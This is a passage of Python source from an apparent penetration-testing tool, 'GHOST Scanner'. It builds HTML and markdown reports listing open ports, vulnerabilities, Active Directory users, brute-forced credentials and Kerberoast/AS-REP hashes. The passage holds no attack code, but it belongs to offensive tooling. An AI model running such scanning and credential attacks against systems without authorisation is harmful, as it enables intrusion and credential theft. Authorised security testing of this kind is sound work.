.gx-top{position:sticky;top:0;z-index:30;display:flex;align-items:center;gap:18px;flex-wrap:wrap;
  padding:12px 22px;background:linear-gradient(180deg,var(--bg2),rgba(14,11,23,.86));
  border-bottom:1px solid var(--line);backdrop-filter:blur(8px)}
.gx-brand{display:flex;align-items:center;gap:10px;font-weight:700;letter-spacing:.5px}
.gx-brand svg{width:26px;height:26px;color:var(--accent)}
.gx-brand b{color:var(--accent)}
.gx-target{color:var(--dim);font-size:13px}
.gx-target code{color:var(--txt);background:var(--card);padding:3px 9px;border-radius:7px;border:1px solid var(--line)}
.gx-actions{margin-left:auto;display:flex;align-items:center;gap:8px}
.gx-search{font-family:var(--mono);font-size:12px;background:var(--card);color:var(--txt);border:1px solid var(--line);
  border-radius:8px;padding:7px 12px;width:180px;outline:none}
.gx-search:focus{border-color:var(--accent)}
.gx-btn{font-family:var(--mono);font-size:12px;background:var(--card);color:var(--txt);border:1px solid var(--line);
  border-radius:8px;padding:7px 12px;cursor:pointer;transition:.15s}
.gx-btn:hover{border-color:var(--accent);color:var(--accent)}
.gx-meta{display:flex;gap:14px;flex-wrap:wrap;align-items:center;padding:12px 22px;border-bottom:1px solid var(--line)}
.gx-meta .gx-dim{color:var(--dim);font-family:var(--mono);font-size:12px}
.gx-pill{font-family:var(--mono);font-weight:700;font-size:12px;padding:5px 12px;border-radius:999px;border:1px solid currentColor}
.gx-tabs{display:flex;gap:4px;flex-wrap:wrap;padding:10px 18px 0;border-bottom:1px solid var(--line);
  position:sticky;top:53px;background:var(--bg);z-index:20}
.gx-tab{font-family:var(--mono);font-size:12.5px;color:var(--dim);background:transparent;border:0;border-bottom:2px solid transparent;
  padding:9px 13px;cursor:pointer;border-radius:7px 7px 0 0;display:flex;align-items:center;gap:6px}
.gx-tab:hover{color:var(--txt);background:var(--card)}
.gx-tab.on{color:var(--accent);border-bottom-color:var(--accent);background:var(--card)}
.gx-cnt{font-size:10px;background:var(--card2);color:var(--dim);border-radius:999px;padding:1px 7px}
.gx-tab.on .gx-cnt{background:var(--accent);color:#fff}
.gx-main{max-width:1180px;margin:0 auto;padding:24px 22px 60px}
.gx-panel{display:none;animation:gxin .25s ease}
.gx-panel.on{display:block}
@keyframes gxin{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
.gx-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
.gx-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 18px;margin-bottom:16px;
  box-shadow:0 1px 0 rgba(255,255,255,.02) inset}
.gx-grid .gx-card{margin-bottom:0}
.gx-ct{font-family:var(--mono);font-size:11px;letter-spacing:1.5px;text-transform:uppercase;color:var(--accent);margin-bottom:12px;
  display:flex;align-items:center;gap:8px}
.gx-ct:before{content:"";width:7px;height:7px;border-radius:2px;background:var(--accent);box-shadow:0 0 8px var(--accent)}
.gx-h4{font-family:var(--mono);font-size:11px;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin:14px 0 6px}
.gx-risk{display:flex;justify-content:space-between;align-items:center;gap:16px;flex-wrap:wrap;
  border-radius:14px;padding:18px 22px;margin-bottom:16px;border:1px solid var(--line);background:var(--card)}
.gx-risk .gx-rk{font-family:var(--mono);font-size:11px;letter-spacing:2px;color:var(--dim);display:block}
.gx-risk .gx-rv{font-size:30px;font-weight:800;letter-spacing:1px}
.gx-risk .gx-rs{font-family:var(--mono);font-size:13px;color:var(--dim)}
.gx-risk.t-crit{border-color:var(--crit)}.gx-risk.t-crit .gx-rv{color:var(--crit)}
.gx-risk.t-med{border-color:var(--med)}.gx-risk.t-med .gx-rv{color:var(--med)}
.gx-risk.t-low{border-color:var(--low)}.gx-risk.t-low .gx-rv{color:var(--low)}
.gx-risk.t-ok{border-color:var(--ok)}.gx-risk.t-ok .gx-rv{color:var(--ok)}
.gx-tiles{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;margin-bottom:16px}
.gx-tile{background:var(--card);border:1px solid var(--line);border-left:3px solid var(--muted);border-radius:11px;padding:13px 15px;
  display:flex;flex-direction:column;gap:4px}
.gx-tile .gx-tn{font-family:var(--mono);font-size:10.5px;letter-spacing:.8px;text-transform:uppercase;color:var(--dim)}
.gx-tile .gx-tv{font-size:24px;font-weight:800}
.gx-tile.t-crit{border-left-color:var(--crit)}.gx-tile.t-crit .gx-tv{color:var(--crit)}
.gx-tile.t-high{border-left-color:var(--high)}.gx-tile.t-high .gx-tv{color:var(--high)}
.gx-tile.t-med{border-left-color:var(--med)}.gx-tile.t-med .gx-tv{color:var(--med)}
.gx-tile.t-low{border-left-color:var(--low)}.gx-tile.t-low .gx-tv{color:var(--low)}
.gx-tile.t-ok{border-left-color:var(--ok)}.gx-tile.t-ok .gx-tv{color:var(--ok)}
.gx-meter{display:flex;height:16px;border-radius:8px;overflow:hidden;background:var(--card2);margin-bottom:12px;border:1px solid var(--line)}
.gx-meter .seg{display:block}
.gx-legends{display:flex;gap:16px;flex-wrap:wrap;font-family:var(--mono);font-size:12px;color:var(--dim)}
.gx-leg .dot{display:inline-block;width:9px;height:9px;border-radius:3px;margin-right:6px;vertical-align:0}
.gx-leg b{color:var(--txt)}
.seg.t-crit,.dot.t-crit{background:var(--crit)}
.seg.t-high,.dot.t-high{background:var(--high)}
.seg.t-med,.dot.t-med{background:var(--med)}
.seg.t-low,.dot.t-low{background:var(--low)}
.seg.t-info,.dot.t-info{background:var(--info)}
.seg.t-ok,.dot.t-ok{background:var(--ok)}
.gx-tw{overflow:auto;border:1px solid var(--line);border-radius:11px}
table{border-collapse:collapse;width:100%;font-size:13px}
thead th{position:sticky;top:0;background:var(--card2);color:var(--dim);font-family:var(--mono);font-size:11px;letter-spacing:.5px;
  text-transform:uppercase;text-align:left;padding:9px 12px;border-bottom:1px solid var(--line)}
tbody td{padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top;word-break:break-word}
tbody tr:last-child td{border-bottom:0}
tbody tr:nth-child(even){background:rgba(255,48,80,.04)}
tbody tr:hover{background:rgba(255,48,80,.09)}
.gx-empty{color:var(--dim);text-align:center;font-style:italic}
.gx-tag{display:inline-block;font-family:var(--mono);font-size:11px;font-weight:700;padding:2px 9px;border-radius:6px;
  color:#fff;background:var(--muted)}
.gx-tag.t-crit{background:var(--crit)}.gx-tag.t-high{background:var(--high);color:#2a1300}.gx-tag.t-med{background:var(--med);color:#221b00}
.gx-tag.t-low{background:var(--low)}.gx-tag.t-ok{background:var(--ok);color:#04140d}.gx-tag.t-info,.gx-tag.t-muted{background:var(--muted)}
.gx-chips{display:flex;flex-wrap:wrap;gap:7px}
.gx-chip{font-family:var(--mono);font-size:12px;background:var(--card2);border:1px solid var(--line);border-radius:7px;padding:3px 10px}
.gx-dim{color:var(--dim)}
.gx-pre{font-size:12px;background:var(--bg2);border:1px solid var(--line);border-radius:11px;padding:14px;max-height:560px;
  overflow:auto;white-space:pre;color:var(--dim)}
.gx-foot{text-align:center;color:var(--dim);font-family:var(--mono);font-size:12px;padding:22px;border-top:1px solid var(--line)}
.gx-foot b{color:var(--accent)}
@media (max-width:760px){.gx-grid{grid-template-columns:1fr}.gx-search{width:120px}}
@media print{
  @page{margin:12mm 11mm}
  html,body{background:#fff!important;color:#161320!important}
  html[data-theme]{--bg:#fff;--bg2:#fff;--card:#fff;--card2:#f3f1fa;--line:#cfc9e0;--txt:#161320;--dim:#54506a;--accent:#d11f3a;
    --crit:#d11f3a;--high:#c2561a;--med:#9a7d0a;--low:#3d63d6;--info:#7a738f;--ok:#0a8f6c;--muted:#9b95ab}
  body{background-image:none!important}
  *{-webkit-print-color-adjust:exact!important;print-color-adjust:exact!important;box-shadow:none!important}
  .gx-top,.gx-tabs,.gx-actions,.gx-foot{display:none!important}
  .gx-main{max-width:none!important;margin:0!important;padding:0!important}
  .gx-panel{display:block!important;opacity:1!important;transform:none!important;animation:none!important;
    page-break-inside:auto;margin-bottom:14px}
  .gx-card,.gx-tile,.gx-risk,table tr{page-break-inside:avoid}
  .gx-grid{grid-template-columns:1fr 1fr}
  tbody tr{display:table-row!important}
}
</style>
</head>
<body>
<header class="gx-top">
  <div class="gx-brand">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M5 21V9a7 7 0 0 1 14 0v12l-2.3-1.6L14.5 21l-2.5-1.7L9.5 21l-2.2-1.6L5 21Z"/><circle cx="9.3" cy="10.5" r="1.1" fill="currentColor" stroke="none"/><circle cx="14.7" cy="10.5" r="1.1" fill="currentColor" stroke="none"/></svg>
    <span>GHOST<b>::</b>Recon Brief</span>
  </div>
  <div class="gx-target">target&nbsp; <code>__TARGET__</code></div>
  <div class="gx-actions">
    <input id="gxq" class="gx-search" type="search" placeholder="/ filter rows">
    <button id="gxtheme" class="gx-btn" type="button">&#9680; theme</button>
    <button class="gx-btn" type="button" onclick="window.print()">&#8615; export</button>
  </div>
</header>
<div class="gx-meta">
  <span class="gx-pill" style="color:var(--__RISKTONE_VAR__)">RISK __RISKLABEL__ &middot; score __RISKSCORE__</span>
  <span class="gx-dim">GHOST v__VERSION__</span>
  <span class="gx-dim">__DATE__</span>
  <span class="gx-dim">__AUTH__</span>
</div>
<nav class="gx-tabs">__NAV__</nav>
<main class="gx-main">__PANELS__</main>
<footer class="gx-foot">&#9651; Generated by <b>GHOST Scanner</b> v__VERSION__ &middot; by @0xgh0stri13y &middot; for authorized security testing only</footer>
<script>
(function(){
  var root=document.documentElement, KEY="ghost_report_theme";
  var saved=localStorage.getItem(KEY); if(saved) root.setAttribute("data-theme",saved);
  var tb=document.getElementById("gxtheme");
  if(tb) tb.addEventListener("click",function(){var t=root.getAttribute("data-theme")==="dark"?"light":"dark";root.setAttribute("data-theme",t);localStorage.setItem(KEY,t);});
  var tabs=[].slice.call(document.querySelectorAll(".gx-tab"));
  var panels=[].slice.call(document.querySelectorAll(".gx-panel"));
  var q=document.getElementById("gxq");
  function filt(){var v=q?q.value.trim().toLowerCase():"";document.querySelectorAll(".gx-panel.on tbody tr").forEach(function(tr){if(tr.querySelector("td.gx-empty"))return;tr.style.display=(!v||tr.textContent.toLowerCase().indexOf(v)>-1)?"":"none";});}
  function show(id){tabs.forEach(function(t){t.classList.toggle("on",t.getAttribute("data-tab")===id);});panels.forEach(function(p){p.classList.toggle("on",p.id==="tab-"+id);});filt();}
  tabs.forEach(function(t){t.addEventListener("click",function(){show(t.getAttribute("data-tab"));});});
  if(q) q.addEventListener("input",filt);
}());
</script>
</body>
</html>"""

    return (
        template
        .replace("__TITLE_TARGET__", esc(report_data.get("target", "")))
        .replace("__TARGET__", esc(report_data.get("target", "")))
        .replace("__DATE__", esc(report_data.get("date", "")))
        .replace("__VERSION__", esc(report_data.get("tool", "")))
        .replace("__RISKLABEL__", esc(risk_label))
        .replace("__RISKTONE_VAR__", risk_tone)
        .replace("__RISKSCORE__", str(risk_score))
        .replace("__AUTH__", auth_str)
        .replace("__NAV__", nav)
        .replace("__PANELS__", panels)
    )

def _md_escape_cell(value):
    """Escape the content of a markdown table cell."""
    text = str(value) if value is not None else ""
    text = text.replace('\r', ' ').replace('\n', '<br>')
    text = text.replace('|', '\\|')
    return text or "-"

def _md_table(headers, rows):
    """Generate a standard markdown table (with pipe and newline escaping)."""
    if not headers:
        return ""
    header_line = "| " + " | ".join(_md_escape_cell(h) for h in headers) + " |"
    sep_line = "| " + " | ".join("---" for _ in headers) + " |"
    lines = [header_line, sep_line]
    for r in rows:
        cells = [_md_escape_cell(r[i] if i < len(r) else "") for i in range(len(headers))]
        lines.append("| " + " | ".join(cells) + " |")
    return "\n".join(lines)

def _build_markdown_report(report_data):
    """Build the complete pentest summary in markdown (GitBook/GitHub compatible)."""
    scan_data = report_data.get("scan_data", {}) or {}
    findings = report_data.get("findings", []) or []
    target = report_data.get("target", "")
    date = report_data.get("date", "")

    general = scan_data.get("general", {}) or {}
    nuclei_summary = scan_data.get("nuclei_summary", {}) or {}
    nuclei_findings_list = scan_data.get("nuclei_findings", []) or []
    spider = scan_data.get("spider", {}) or {}
    injection = scan_data.get("injection", {}) or {}
    vhosts = scan_data.get("vhosts", []) or []
    dir_hits = scan_data.get("directory_hits", []) or []
    api_endpoints = scan_data.get("api_endpoints", []) or []
    users = scan_data.get("users", []) or []
    emails = scan_data.get("emails", []) or []
    creds = scan_data.get("bruteforce_credentials", []) or []
    wordpress = scan_data.get("wordpress", {}) or {}
    robots_paths = scan_data.get("robots_paths", []) or []
    http_methods = scan_data.get("http_methods", []) or []
    src_code = scan_data.get("source_code_analysis", {}) or {}
    src_findings = src_code.get("findings") or []
    nmap_data = scan_data.get("nmap", {}) or {}
    nmap_ports = nmap_data.get("ports", []) or []
    nmap_nse = nmap_data.get("nse_results", []) or []
    active_directory = scan_data.get("active_directory", {}) or {}
    ad_ldap = active_directory.get("ldap") or {}
    ad_imp = active_directory.get("impacket") or {}
    ad_nxc = active_directory.get("nxc") or {}
    asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes") or []
    kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes") or []
    ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials") or []

    def _tech_str(item):
        if isinstance(item, dict):
            name = str(item.get("name", "")).strip()
            detail = str(item.get("detail", "")).strip()
            return f"{name} ({detail})" if name and detail else (name or detail or "")
        return str(item)

    def _count_label(total, limit):
        """'(N)' if total <= limit; '(top limit of total)' otherwise."""
        if total <= limit:
            return f"({total})"
        return f"(top {limit} of {total})"

    SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}

    parts = []
    parts.append(f"# GHOST Scanner — Pentest Report")
    parts.append("")
    parts.append(f"- **Target:** `{target}`")
    parts.append(f"- **Date:** {date}")
    parts.append(f"- **Tool:** GHOST Scanner v{report_data.get('tool', '')}")
    parts.append("")

    parts.append("## Executive Summary")
    parts.append("")
    techs = general.get("technologies", []) or []
    tech_str = ", ".join(_tech_str(t) for t in techs) or "-"
    overview_rows = [
        ["HTTP Status", str(general.get("status_code", "-"))],
        ["Server", str(general.get("server", "-"))],
        ["Technologies", tech_str],
        ["Findings", str(len(findings))],
        ["Open ports (nmap)", str(len(nmap_ports))],
        ["Targeted NSE results", str(len(nmap_nse))],
        ["Nuclei vulnerabilities", str(len(nuclei_findings_list))],
        ["Spider URLs", str(spider.get("total_urls", 0))],
        ["Subdomains (vhosts)", str(len(vhosts))],
        ["Directories found", str(len(dir_hits))],
        ["API Endpoints", str(len(api_endpoints))],
        ["Users", str(len(users))],
        ["Emails", str(len(emails))],
        ["Valid credentials", str(len(creds))],
        ["WordPress vulnerabilities", str(len(wordpress.get("vulnerabilities") or []))],
        ["AD Users (LDAP)", str(len(ad_ldap.get("users") or []))],
        ["AS-REP roastable", str(len(asrep_hashes))],
        ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
        ["AD Credentials (NXC)", str(len(ad_creds))],
        ["Source code findings", str(len(src_findings))],
    ]
    parts.append(_md_table(["Field", "Value"], overview_rows))
    parts.append("")

    sec_header_names = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options",
        "Referrer-Policy", "Permissions-Policy",
    ]
    headers = (general.get("headers") or {})
    sec_rows = []
    for h in sec_header_names:
        v = headers.get(h) or headers.get(h.lower()) or "-"
        present = v != "-"
        sec_rows.append([h, "OK" if present else "MISSING", v])
    parts.append("## Security Headers")
    parts.append("")
    parts.append(_md_table(["Header", "Status", "Value"], sec_rows))
    parts.append("")

    cookies = general.get("cookies") or []
    if cookies:
        parts.append("## Detected Cookies")
        parts.append("")
        parts.append(_md_table(["Cookie"], [[c] for c in cookies]))
        parts.append("")

    misc_rows = []
    if http_methods:
        misc_rows.append(["Allowed HTTP methods", ", ".join(http_methods)])
    if robots_paths:
        misc_rows.append([f"Robots/sitemap paths ({len(robots_paths)})", ", ".join(robots_paths[:15])])
    if misc_rows:
        parts.append("## Additional HTTP Information")
        parts.append("")
        parts.append(_md_table(["Category", "Value"], misc_rows))
        parts.append("")

    if nmap_ports:
        parts.append(f"## Port Scan (Nmap) ({len(nmap_ports)})")
        parts.append("")
        if nmap_data.get("command"):
            parts.append(f"- **Command:** `{nmap_data['command']}`")
        if nmap_data.get("host"):
            parts.append(f"- **Host:** `{nmap_data['host']}`")
        if nmap_data.get("hostnames"):
            parts.append(f"- **Hostnames:** {', '.join(nmap_data['hostnames'])}")
        parts.append("")
        nm_rows = []
        for p in nmap_ports:
            vparts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join(v for v in vparts if v).strip() or "-"
            nm_rows.append([
                f"{p.get('port', '-')}/{p.get('protocol', '')}",
                str(p.get("state", "-")),
                str(p.get("service", "") or "-"),
                version_str,
            ])
        parts.append(_md_table(["Port", "Status", "Service", "Version"], nm_rows))
        parts.append("")

    if nmap_nse:
        parts.append(f"## Targeted Nmap NSE ({len(nmap_nse)})")
        parts.append("")
        if (nmap_data.get("nse") or {}).get("command"):
            parts.append(f"- **Command:** `{(nmap_data.get('nse') or {}).get('command')}`")
            parts.append("")
        rows = [[
            f"{item.get('port', '-')}/{item.get('protocol', '')}",
            str(item.get("service") or "-"),
            str(item.get("script_id") or "-"),
            str(item.get("output") or "-"),
        ] for item in nmap_nse]
        parts.append(_md_table(["Port", "Service", "Script", "Output"], rows))
        parts.append("")

    if spider:
        parts.append("## Spidering")
        parts.append("")
        spider_rows = [
            ["Total URLs", str(spider.get("total_urls", 0))],
            ["Unique parameters", str(spider.get("total_params", 0))],
            ["Forms", str(spider.get("total_forms", 0))],
        ]
        parts.append(_md_table(["Metric", "Value"], spider_rows))
        parts.append("")
        sample_urls = spider.get("sample_urls") or []
        if sample_urls:
            parts.append(f"### Discovered URLs ({len(sample_urls)})")
            parts.append("")
            parts.append(_md_table(["URL"], [[u] for u in sample_urls]))
            parts.append("")

    if src_code:
        sev_stats = src_code.get("summary") or {}
        parts.append("## Source Code Analysis")
        parts.append("")
        code_overview = [
            ["Pages analyzed", str(src_code.get("pages_analyzed", 0))],
            ["JS/JSON assets analyzed", str(src_code.get("assets_analyzed", 0))],
            ["Total findings", str(len(src_findings))],
            ["Critical", str(sev_stats.get("critical", 0))],
            ["High", str(sev_stats.get("high", 0))],
            ["Medium", str(sev_stats.get("medium", 0))],
            ["Low", str(sev_stats.get("low", 0))],
        ]
        parts.append(_md_table(["Metric", "Value"], code_overview))
        parts.append("")
        if src_findings:
            sorted_src = sorted(
                src_findings,
                key=lambda x: SEV_ORDER.get(x.get("severity", "low"), 9),
            )
            parts.append(f"### Source Code Findings Detail ({len(sorted_src)})")
            parts.append("")
            rows = [[
                (f.get("severity") or "").upper(),
                str(f.get("type", "-")),
                str(f.get("value", "-")),
                str(f.get("url", "-")),
            ] for f in sorted_src]
            parts.append(_md_table(["Severity", "Type", "Detected Value", "URL"], rows))
            parts.append("")

    if vhosts:
        parts.append(f"## Subdomains (vhosts) Found ({len(vhosts)})")
        parts.append("")
        rows = [[str(v.get("status", "-")),
                 str(v.get("fqdn") or v.get("subdomain", "-")),
                 str(v.get("size", "-"))]
                for v in vhosts]
        parts.append(_md_table(["Status", "VHost", "Size"], rows))
        parts.append("")

    if dir_hits:
        parts.append(f"## Directories Found ({len(dir_hits)})")
        parts.append("")
        rows = [[str(h.get("status", "-")), str(h.get("url", "-")), str(h.get("size", "-"))]
                for h in dir_hits]
        parts.append(_md_table(["Status", "URL", "Size"], rows))
        parts.append("")

    if wordpress:
        wp_version = wordpress.get("version") or {}
        wp_theme = wordpress.get("main_theme") or {}
        wp_users = wordpress.get("users") or []
        wp_plugins = wordpress.get("plugins") or []
        wp_vulns = wordpress.get("vulnerabilities") or []
        wp_creds = wordpress.get("credentials") or []
        parts.append("## WordPress / WPScan")
        parts.append("")
        wp_rows = [
            ["Detected", "Yes" if wordpress.get("detected") else "Not confirmed"],
            ["Version", str(wp_version.get("number") or "-")],
            ["Version status", str(wp_version.get("status") or "-")],
            ["Main theme", str(wp_theme.get("name") or "-")],
            ["Detected plugins", str(len(wp_plugins))],
            ["WPScan users", str(len(wp_users))],
            ["Vulnerabilities", str(len(wp_vulns))],
            ["WP credentials", str(len(wp_creds))],
        ]
        parts.append(_md_table(["Field", "Value"], wp_rows))
        parts.append("")
        if wp_users:
            parts.append("### WordPress Users")
            parts.append("")
            parts.append(_md_table(["User", "Name"], [[u.get("username", "-"), u.get("name", "-")] for u in wp_users]))
            parts.append("")
        if wp_vulns:
            parts.append("### WordPress Vulnerabilities")
            parts.append("")
            rows = [[
                v.get("component_type", "-"),
                v.get("component", "-"),
                v.get("title", "-"),
                v.get("fixed_in", "-"),
            ] for v in wp_vulns]
            parts.append(_md_table(["Type", "Component", "Title", "Fixed in"], rows))
            parts.append("")

    if active_directory:
        ad_ldap = active_directory.get("ldap") or {}
        ad_nxc = active_directory.get("nxc") or {}
        ad_kb = active_directory.get("kerbrute") or {}
        ad_imp = active_directory.get("impacket") or {}
        ad_creds = (ad_nxc.get("bruteforce") or {}).get("credentials", []) or []
        asrep_hashes = (ad_imp.get("asrep_roast") or {}).get("hashes", []) or []
        kerberoast_hashes = (ad_imp.get("kerberoast") or {}).get("hashes", []) or []
        parts.append("## Active Directory")
        parts.append("")
        ad_rows = [
            ["Domain Controller", str(active_directory.get("target") or "-")],
            ["Domain", str(active_directory.get("domain") or "-")],
            ["Base DN", str(active_directory.get("base_dn") or "-")],
            ["Mode", str(active_directory.get("auth_mode") or "-")],
            ["Kerbrute valid users", str(len(ad_kb.get("valid_users") or []))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["LDAP users", str(len(ad_ldap.get("users") or []))],
            ["LDAP groups", str(len(ad_ldap.get("groups") or []))],
            ["LDAP computers", str(len(ad_ldap.get("computers") or []))],
            ["NXC credentials", str(len(ad_creds))],
        ]
        parts.append(_md_table(["Field", "Value"], ad_rows))
        parts.append("")
        if ad_kb.get("valid_users"):
            parts.append("### Kerbrute Valid Users")
            parts.append("")
            parts.append(_md_table(["User"], [[u] for u in ad_kb.get("valid_users", [])]))
            parts.append("")
        if ad_ldap.get("users"):
            parts.append("### LDAP Users")
            parts.append("")
            rows = [[u.get("username", "-"), u.get("upn", "-"), u.get("cn", "-"), ", ".join(u.get("memberOf") or [])]
                    for u in ad_ldap.get("users", [])]
            parts.append(_md_table(["User", "UPN", "CN", "Groups"], rows))
            parts.append("")
        if ad_ldap.get("groups"):
            parts.append("### LDAP Groups")
            parts.append("")
            rows = [[g.get("name", "-"), g.get("description", "-"), str(len(g.get("members") or []))]
                    for g in ad_ldap.get("groups", [])]
            parts.append(_md_table(["Group", "Description", "Members"], rows))
            parts.append("")
        if ad_ldap.get("computers"):
            parts.append("### LDAP Computers")
            parts.append("")
            rows = [[c.get("name", "-"), c.get("os", "-"), c.get("os_version", "-")]
                    for c in ad_ldap.get("computers", [])]
            parts.append(_md_table(["Computer", "OS", "Version"], rows))
            parts.append("")
        if ad_creds:
            parts.append("### Valid AD Credentials (NXC)")
            parts.append("")
            parts.append(_md_table(["User", "Password"], [[c.get("username", "-"), c.get("password", "-")] for c in ad_creds]))
            parts.append("")
        if asrep_hashes:
            parts.append("### AS-REP Roasting (impacket-GetNPUsers)")
            parts.append("")
            parts.append(_md_table(["User", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in asrep_hashes]))
            parts.append("")
        if kerberoast_hashes:
            parts.append("### Kerberoasting (impacket-GetUserSPNs)")
            parts.append("")
            parts.append(_md_table(["User/SPN", "Hash"], [[h.get("username", "-"), h.get("hash", "-")] for h in kerberoast_hashes]))
            parts.append("")
        raw_commands = active_directory.get("raw_commands") or []
        if raw_commands:
            parts.append("### Raw AD Tool Output")
            parts.append("")
            for cmd in raw_commands:
                parts.append(f"#### {cmd.get('label', 'command')}")
                parts.append("")
                parts.append(f"- **Command:** `{cmd.get('command', '-')}`")
                parts.append(f"- **Return code:** `{cmd.get('returncode', '-')}`")
                parts.append("")
                parts.append("```text")
                parts.append(str(cmd.get("output", "") or "").strip() or "-")
                parts.append("```")
                parts.append("")

    if api_endpoints:
        parts.append(f"## Discovered API Endpoints ({len(api_endpoints)})")
        parts.append("")
        rows = [[str(ep.get("status", "-")),
                 str(ep.get("endpoint") or ep.get("url", "-")),
                 str(ep.get("content_type", "-"))]
                for ep in api_endpoints]
        parts.append(_md_table(["Status", "Endpoint", "Content-Type"], rows))
        parts.append("")

    if users or emails:
        parts.append("## Discovered Users & Emails")
        parts.append("")
        ue_rows = []
        if users:
            ue_rows.append(["Users", ", ".join(users)])
        if emails:
            ue_rows.append(["Emails", ", ".join(emails)])
        parts.append(_md_table(["Category", "Values"], ue_rows))
        parts.append("")

    if injection.get("executed"):
        parts.append("## Injection Tests")
        parts.append("")
        inj_rows = [
            ["Forms detected", str(injection.get("forms_found", 0))],
            ["GET parameters detected", str(injection.get("url_params_found", 0))],
            ["GET parameters tested", str(len(injection.get("tested_get_params", [])))],
            ["Form inputs tested", str(len(injection.get("tested_form_inputs", [])))],
        ]
        parts.append(_md_table(["Metric", "Value"], inj_rows))
        parts.append("")

    if creds:
        parts.append("## Valid Credentials Found")
        parts.append("")
        rows = []
        for c in creds:
            user = c.get("username") if isinstance(c, dict) else str(c)
            pwd = c.get("password") if isinstance(c, dict) else "-"
            rows.append([str(user), str(pwd)])
        parts.append(_md_table(["User", "Password"], rows))
        parts.append("")

    if nuclei_summary:
        parts.append("## Vulnerabilities by Severity (Nuclei)")
        parts.append("")
        rows = []
        for sev in sorted(nuclei_summary.keys(), key=lambda s: SEV_ORDER.get(s, 99)):
            tids = nuclei_summary[sev]
            rows.append([sev.upper(), str(len(tids)), ", ".join(sorted(set(map(str, tids))))])
        parts.append(_md_table(["Severity", "Count", "Unique Templates"], rows))
        parts.append("")

    relevant_nuclei = [n for n in nuclei_findings_list
                       if (n.get('severity') or '').lower() in ('critical', 'high', 'medium', 'low')]
    if relevant_nuclei:
        sorted_rel = sorted(relevant_nuclei,
                            key=lambda x: (SEV_ORDER.get((x.get('severity') or 'unknown').lower(), 99),
                                           str(x.get('template_id', ''))))
        parts.append(f"## Relevant Nuclei Findings ({len(sorted_rel)})")
        parts.append("")
        rows = [[(n.get('severity') or '').upper(),
                 str(n.get('template_id', '-')),
                 str(n.get('name', '-')),
                 str(n.get('url', '-'))]
                for n in sorted_rel]
        parts.append(_md_table(["Severity", "Template", "Name", "URL"], rows))
        parts.append("")

    if findings:
        cats = {}
        for f in findings:
            m = re.match(r'^\[([^\]]+)\]', str(f))
            cat = m.group(1) if m else "OTHER"
            cats.setdefault(cat, []).append(str(f))
        parts.append(f"## Classified Findings (total: {len(findings)})")
        parts.append("")
        cat_rows = [[cat, str(len(cats[cat]))] for cat in sorted(cats.keys())]
        parts.append(_md_table(["Category", "Count"], cat_rows))
        parts.append("")
        parts.append(f"### Findings Detail ({len(findings)})")
        parts.append("")
        rows = []
        for f in findings:
            m = re.match(r'^\[([^\]]+)\]\s*(.*)', str(f))
            if m:
                rows.append([m.group(1), m.group(2)])
            else:
                rows.append(["OTHER", str(f)])
        parts.append(_md_table(["Category", "Detail"], rows))
        parts.append("")

    parts.append("---")
    parts.append("")
    parts.append("_Automatically generated by GHOST Scanner._")
    return "\n".join(parts)


def save_report(output_file=None):
    """Save findings and relevant data to TXT, JSON, HTML and MD."""
    txt_file, json_file, html_file, md_file = _normalize_output_paths(output_file, TARGET_URL)
    scan_stats = {
        "authenticated": AUTHENTICATED,
        "threads": THREADS,
        "timeout": DEFAULT_TIMEOUT,
        "delay": REQUEST_DELAY,
        "total_findings": len(FINDINGS),
        "total_api_endpoints": len(SCAN_DATA.get("api_endpoints", [])),
        "total_vhosts": len(SCAN_DATA.get("vhosts", [])),
        "total_open_ports": len((SCAN_DATA.get("nmap") or {}).get("ports", [])),
        "total_nmap_nse_results": len((SCAN_DATA.get("nmap") or {}).get("nse_results", [])),
        "total_dir_hits": len(SCAN_DATA.get("directory_hits", [])),
        "injection_forms_found": SCAN_DATA.get("injection", {}).get("forms_found", 0),
        "injection_get_params_found": SCAN_DATA.get("injection", {}).get("url_params_found", 0),
        "injection_get_params_tested": len(SCAN_DATA.get("injection", {}).get("tested_get_params", [])),
        "injection_form_inputs_tested": len(SCAN_DATA.get("injection", {}).get("tested_form_inputs", [])),
        "total_users": len(SCAN_DATA.get("users", [])),
        "total_emails": len(SCAN_DATA.get("emails", [])),
        "total_bruteforce_credentials": len(SCAN_DATA.get("bruteforce_credentials", [])),
        "wordpress_detected": bool((SCAN_DATA.get("wordpress") or {}).get("detected")),
        "wordpress_users": len((SCAN_DATA.get("wordpress") or {}).get("users", [])),
        "wordpress_vulnerabilities": len((SCAN_DATA.get("wordpress") or {}).get("vulnerabilities", [])),
        "wordpress_credentials": len((SCAN_DATA.get("wordpress") or {}).get("credentials", [])),
        "total_spider_urls": SCAN_DATA.get("spider", {}).get("total_urls", 0),
        "total_source_code_findings": len((SCAN_DATA.get("source_code_analysis") or {}).get("findings", [])),
        "source_code_pages_analyzed": (SCAN_DATA.get("source_code_analysis") or {}).get("pages_analyzed", 0),
        "source_code_assets_analyzed": (SCAN_DATA.get("source_code_analysis") or {}).get("assets_analyzed", 0),
        "active_directory_users": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("users", [])),
        "active_directory_kerbrute_users": len(((SCAN_DATA.get("active_directory") or {}).get("kerbrute") or {}).get("valid_users", [])),
        "active_directory_groups": len(((SCAN_DATA.get("active_directory") or {}).get("ldap") or {}).get("groups", [])),
